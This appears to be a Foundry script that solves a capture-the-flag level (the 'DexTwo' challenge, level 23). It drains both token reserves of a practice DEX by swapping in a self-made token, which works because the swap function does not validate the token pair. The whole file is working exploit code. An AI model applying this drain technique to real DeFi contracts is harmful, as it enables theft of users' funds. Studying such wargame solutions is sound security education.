// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "../instances/Ilevel23.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract POC is Script {

    DexTwo level23 = DexTwo(0x83292AE1598a07b2A3418Cc960A6c9E7a961B87b);
    function run() external{
        vm.startBroadcast();
        address ZTN = address(0x207E2BbaEF4A5D3E1c11748Bacceac156b5c04A1);
        address token1 = level23.token1();
        address token2 = level23.token2();

        IERC20(ZTN).approve(address(level23), 300);
        IERC20(ZTN).transfer(address(level23), 100);

        level23.swap(ZTN, token1, 100);
        level23.swap(ZTN, token2, 200);

        console.log("Remaining token1 balance : ", level23.balanceOf(token1, address(level23)));
        console.log("Remaining token2 balance : ", level23.balanceOf(token2, address(level23)));
        vm.stopBroadcast();
    }
}

